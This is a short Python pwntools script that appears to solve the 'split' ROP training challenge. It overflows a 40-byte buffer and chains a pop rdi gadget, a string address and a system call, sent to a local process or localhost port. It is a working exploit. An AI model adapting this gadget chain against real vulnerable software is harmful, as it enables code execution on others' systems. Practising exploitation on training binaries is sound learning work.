from pwn import *

exe = ELF('./split')
context.binary = exe
context.log_level = 'info'

libc = ELF('./split')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(exe.path)

offset = 40 #pattern search $rsp
usefulFunctiondirectsursys = 0x000000000040074b
pop_rdi = 0x00000000004007c3
bincat = 0x601060 #0x601060 - 0x601071 



log.info(hex(usefulFunctiondirectsursys))

payload = flat({offset:[pop_rdi,bincat,usefulFunctiondirectsursys]})

io.sendline(payload)

io.interactive()

